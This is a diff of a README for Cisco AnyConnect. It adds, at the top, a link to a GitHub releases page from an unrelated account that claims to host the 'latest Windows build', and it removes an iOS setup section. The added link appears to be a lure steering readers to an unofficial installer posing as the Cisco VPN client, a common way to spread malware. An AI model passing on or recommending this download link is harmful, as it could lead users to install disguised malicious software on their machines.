@@ -1,5 +1,8 @@
 # Cisco AnyConnect
 
+*Download latest version from Releases:          
+https://github.com/anycdeploy/Cisco-AnyConnect/releases/tag/4.11
+
 Use the link provided above to download the latest Windows build of Cisco AnyConnect. After obtaining the installer, launch it and follow the steps in the setup wizard.
 
 After the setup finishes, open the AnyConnect client and enter the VPN server address supplied by your network administrator. Log in with your credentials to establish a secure connection to your organization’s network.
@@ -119,14 +122,3 @@ Cisco AnyConnect is available for both iOS and Android, providing key mobile cap
 * **Per-App VPN**: Restricts VPN usage to approved applications.
 * **Always-On VPN**: Keeps the VPN connection active at all times.
 * **Split Tunneling**: Sends selected traffic through the VPN while routing the remainder locally.
-
-### Setting Up Mobile VPN on iOS
-
-1. Download AnyConnect from the App Store.
-2. Configure VPN profiles and user credentials.
-3. Enable **Per-App VPN** in the device’s VPN settings.
-
-```yaml
-vpn:
-  enable: true
-```
